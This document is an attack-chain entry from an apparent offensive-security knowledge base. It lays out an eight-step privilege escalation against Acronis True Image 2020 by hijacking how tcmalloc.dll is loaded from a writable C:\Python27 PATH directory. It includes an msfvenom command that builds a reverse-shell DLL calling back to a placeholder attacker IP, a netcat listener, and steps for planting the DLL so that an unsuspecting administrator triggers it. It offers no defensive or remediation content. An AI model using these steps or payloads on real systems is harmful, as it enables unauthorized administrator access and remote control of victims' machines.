---
id: acronis-dll-hijack-chain-001
tags:
  - dll-hijacking
  - privilege-escalation
  - windows
  - acronis
type: attack_chain
tools:
  - '[[tools/Process-Monitor]]'
  - '[[tools/msfvenom]]'
tactics:
  - '[[Privilege Escalation]]'
verified: false
platforms:
  - Windows
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Install-Python-27-for-Writable-PATH]]'
  - '[[procedures/Monitor-DLL-Loading-with-Process-Monitor]]'
  - '[[procedures/Generate-Malicious-DLL-with-msfvenom]]'
  - '[[procedures/Deploy-Malicious-DLL-to-Target]]'
  - '[[procedures/Trigger-Execution-and-Receive-Shell]]'
step_count: 8
techniques:
  - '[[DLL Search Order Hijacking]]'
  - '[[Dynamic-link Library Injection]]'
updated_at: '2025-12-14T17:29:19.679Z'
description: >-
  This attack chain exploits an untrusted DLL search order vulnerability in
  Acronis True Image 2020, allowing authenticated users to escalate privileges
  to administrator by hijacking tcmalloc.dll loading from a writable Python PATH
  directory.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[DLL Search Order Hijacking]]'
  - '[[Dynamic-link Library Injection]]'
---
# Privilege Escalation via DLL Search Order Hijacking in Acronis True Image 2020

Multi-stage attack chain demonstrating privilege escalation through DLL hijacking in Acronis True Image 2020 by leveraging a writable directory in the system PATH added by Python 2.7 installation. An authenticated low-privileged user can place a malicious DLL in C:\Python27, which is searched during DLL loading by TrueImage.exe when run as administrator, resulting in arbitrary code execution as the admin.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 8 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Environment] --> B[Monitor DLL Loading]
    B --> C[Generate Payload]
    C --> D[Deploy DLL]
    D --> E[Trigger Execution]
    E --> F[Receive Shell]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#3498db
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Process-Monitor]]
- [[tools/msfvenom]]

### Target Environment

- Windows OS (tested on Windows 10)
- Acronis True Image 2020 (ver. 24.6.25700) installed
- Python 2.7 installed (adds C:\Python27 to PATH)
- Administrative access to run Acronis as admin
- Attacker machine with Kali Linux for payload generation

### Initial Access Requirements

- Authenticated low-privileged user account on target
- Network access to transfer DLL (e.g., SMB share or direct copy)
- Listener setup on attacker machine (e.g., netcat or Metasploit)

## Detailed Attack Procedures

### Step 1: Set up Lab Environment
procedure: [[procedures/Install-Python-27-for-Writable-PATH]]

**Objective**: Install Python 2.7 to introduce a writable directory (C:\Python27) into the system PATH, enabling DLL hijacking.

**Instructions**: Download and install Python 2.7 from the official installer, ensuring the default path C:\Python27 is added to the system PATH environment variable. This directory is writable by authenticated users.

**Expected Output**: Python 2.7 installed, C:\Python27 visible in PATH via `echo %PATH%` in Command Prompt.

**Success Indicators**:
- C:\Python27 directory created and writable
- PATH includes C:\Python27

### Step 2: Launch Acronis and Monitor Process Activity
procedure: [[procedures/Monitor-DLL-Loading-with-Process-Monitor]]

**Objective**: Identify DLL loading behavior of TrueImage.exe to confirm search in untrusted PATH directories.

**Instructions**: Run Acronis True Image as administrator via `C:\Program Files (x86)\Acronis\TrueImageHome\TrueImageLauncher.exe`. Simultaneously, use [[tools/Process-Monitor]] to capture events.

**Expected Output**: Process Monitor logs showing TrueImage.exe attempting to load tcmalloc.dll from PATH, including failed loads from C:\Python27.

**Success Indicators**:
- Observed DLL search order includes writable paths
- NOT FOUND results for tcmalloc.dll in Python27

### Step 3: Configure Process Monitor Filters
procedure: [[procedures/Monitor-DLL-Loading-with-Process-Monitor]]

**Objective**: Filter logs to focus on relevant DLL loading failures in untrusted paths.

**Instructions**: In Process Monitor, apply filters: Process Name is TrueImage.exe (Include), Result contains NOT FOUND (Include), Path contains Python27 (Include).

**Expected Output**: Filtered events revealing TrueImage.exe calling LoadLibrary on tcmalloc.dll from C:\Python27 with admin privileges.

**Success Indicators**:
- Specific events captured for tcmalloc.dll in Python27
- Confirmation of administrative context

### Step 4: Generate Malicious DLL Payload
procedure: [[procedures/Generate-Malicious-DLL-with-msfvenom]]

**Objective**: Create a malicious tcmalloc.dll containing a reverse shell payload.

**Instructions**: On Kali Linux, execute [[commands/msfvenom-generate-dll-payload]] to generate the DLL:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[Attacker-IP] LPORT=[Attacker-port] -f dll > tcmalloc.dll
```

Replace [Attacker-IP] and [Attacker-port] with your listener details.

**Expected Output**: Binary file tcmalloc.dll created with embedded reverse shell.

**Success Indicators**:
- DLL file generated without errors
- File size indicates payload inclusion

### Step 5: Start Reverse Shell Listener
procedure: [[procedures/Trigger-Execution-and-Receive-Shell]]

**Objective**: Prepare attacker machine to receive the incoming shell connection.

**Instructions**: Use netcat or Metasploit to listen on the specified LPORT, e.g., `nc -lvnp [Attacker-port]`.

**Expected Output**: Listener active and waiting for connections.

**Success Indicators**:
- Port listening confirmed
- No firewall blocks

### Step 6: Transfer and Place Malicious DLL
procedure: [[procedures/Deploy-Malicious-DLL-to-Target]]

**Objective**: Place the malicious DLL in the writable C:\Python27 directory on the target.

**Instructions**: Copy tcmalloc.dll to C:\Python27 using file transfer methods like SMB or direct access as authenticated user.

**Expected Output**: DLL successfully placed in C:\Python27, verifiable via dir command.

**Success Indicators**:
- File present and executable
- No permission denied errors

### Step 7: Trigger Execution by Launching Acronis
procedure: [[procedures/Trigger-Execution-and-Receive-Shell]]

**Objective**: Cause TrueImage.exe to load the malicious DLL when run as administrator.

**Instructions**: Have an administrator launch Acronis True Image, which spawns TrueImage.exe and searches PATH for tcmalloc.dll.

**Expected Output**: Reverse shell connection initiated to attacker listener.

**Success Indicators**:
- Admin launches app without suspicion
- DLL loaded from Python27

### Step 8: Receive and Verify Reverse Shell
procedure: [[procedures/Trigger-Execution-and-Receive-Shell]]

**Objective**: Confirm privilege escalation by interacting with the admin shell.

**Instructions**: Accept the incoming connection on the listener and execute commands like `whoami` to verify admin context.

**Expected Output**: Shell prompt as 'John' or local administrator.

**Success Indicators**:
- Shell received with admin privileges
- Commands execute with elevated access

## Attack Chain Summary

### Key Achievements

1. Identified vulnerable DLL search order in Acronis True Image
2. Exploited writable Python PATH for DLL hijacking
3. Achieved privilege escalation to administrator via reverse shell

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[DLL Search Order Hijacking]]
- [[Dynamic-link Library Injection]]

### MITRE ATT&CK Tactics

- [[Privilege Escalation]]

---

*Last updated: 2023-10-01T00:00:00Z*
